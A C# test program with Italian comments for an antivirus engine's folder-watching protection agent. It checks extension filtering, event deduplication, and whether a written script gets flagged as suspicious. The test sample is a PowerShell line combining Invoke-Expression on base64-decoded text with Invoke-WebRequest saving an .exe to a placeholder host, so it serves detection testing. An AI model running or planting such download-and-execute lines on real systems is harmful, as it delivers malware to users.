using FFGuardian.Engine10;

internal static class Program
{
    // Famiglia di rilevamento prevista dallo scanner per gli script: Heuristic.Suspicious.Script.
    // Il test verifica il comportamento e non dipende dal nome esatto, che può evolvere.
    private static async Task<int> Main()
    {
        string root = Path.Combine(Path.GetTempPath(), "FFGuardian-Agent-" + Guid.NewGuid().ToString("N"));
        string monitored = Path.Combine(root, "Monitored");
        Directory.CreateDirectory(monitored);

        try
        {
            using FFGuardianEngine10 engine = new(
                Path.Combine(root, "signatures.json"),
                updaterPublicKeyPem: null,
                Path.Combine(root, "Quarantine"),
                Path.Combine(root, "Rollback"));

            ProtectionAgentOptions10 options = new(
                new[] { monitored },
                TimeSpan.FromSeconds(5),
                TimeSpan.FromMilliseconds(150),
                32,
                IncludeSubdirectories: true);

            string deduplicationFile = Path.Combine(monitored, "deduplication.cmd");
            await File.WriteAllTextAsync(deduplicationFile, "@echo off\necho test");

            await using AutonomousProtectionAgent10 agent = new(engine, options);
            TaskCompletionSource<ProtectionAgentEvent10> suspiciousScanned =
                new(TaskCreationOptions.RunContinuationsAsynchronously);

            agent.Activity += (_, e) =>
            {
                if (e.EventType == "Scanned" &&
                    e.Path.EndsWith("payload.ps1", StringComparison.OrdinalIgnoreCase) &&
                    e.ScanResult is not null)
                {
                    suspiciousScanned.TrySetResult(e);
                }
            };

            agent.Start();
            Ensure(agent.IsRunning, "L'agente non risulta avviato.");
            Ensure(agent.MonitoredFolderCount == 1, "La cartella di test non è monitorata.");

            string ignored = Path.Combine(monitored, "readme.txt");
            await File.WriteAllTextAsync(ignored, "harmless text");
            Ensure(!agent.QueueFileForTest(ignored), "Un'estensione non monitorata è stata accodata.");

            bool firstQueued = agent.QueueFileForTest(deduplicationFile);
            bool duplicateQueued = agent.QueueFileForTest(deduplicationFile);
            Ensure(firstQueued, "Il file di deduplicazione non è stato accodato.");
            Ensure(!duplicateQueued, "La deduplicazione degli eventi non ha funzionato.");

            string suspicious = Path.Combine(monitored, "payload.ps1");
            await File.WriteAllTextAsync(
                suspicious,
                "Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QQ=='))); " +
                "Invoke-WebRequest 'https://example.invalid/file' -OutFile $env:TEMP+'\\x.exe'");

            ProtectionAgentEvent10 result = await suspiciousScanned.Task.WaitAsync(TimeSpan.FromSeconds(20));
            Ensure(result.ScanResult is not null, "Risultato scansione automatica mancante.");
            Ensure(result.ScanResult.Verdict is ThreatVerdict10.Suspicious or ThreatVerdict10.Malicious,
                $"Lo script doveva risultare almeno sospetto, ottenuto: {result.ScanResult.Verdict}.");
            Ensure(result.ScanResult.Confidence > 0, "La scansione automatica non ha prodotto un punteggio.");
            Ensure(File.Exists(suspicious), "L'agente non deve applicare remediation automatica.");

            await agent.StopAsync();
            Ensure(!agent.IsRunning, "L'agente non si è arrestato correttamente.");

            Console.WriteLine("FFGuardian.Engine10 agent tests: PASSED");
            return 0;
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine("FFGuardian.Engine10 agent tests: FAILED");
            Console.Error.WriteLine(ex);
            return 1;
        }
        finally
        {
            try
            {
                if (Directory.Exists(root))
                    Directory.Delete(root, recursive: true);
            }
            catch
            {
            }
        }
    }

    private static void Ensure(bool condition, string message)
    {
        if (!condition)
            throw new InvalidOperationException(message);
    }
}
